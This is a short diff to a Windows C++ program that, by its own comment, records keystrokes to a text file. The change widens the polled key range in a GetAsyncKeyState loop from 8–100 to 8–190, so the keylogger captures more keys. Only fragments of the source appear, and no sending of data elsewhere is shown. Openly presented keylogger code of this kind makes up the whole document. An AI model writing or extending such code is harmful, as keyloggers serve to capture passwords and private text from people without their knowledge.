@@ -1,4 +1,4 @@
-//This program records the keystrokes in a text file  
+//This program records keystrokes in a text file  
 
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
@@ -93,7 +93,7 @@ int main()
 
 	while (true)
   	{
-		for (int key = 8; key <= 100; key++)
+		for (int key = 8; key <= 190; key++)
 		{
 			if (GetAsyncKeyState(key) == -32767)
       			{
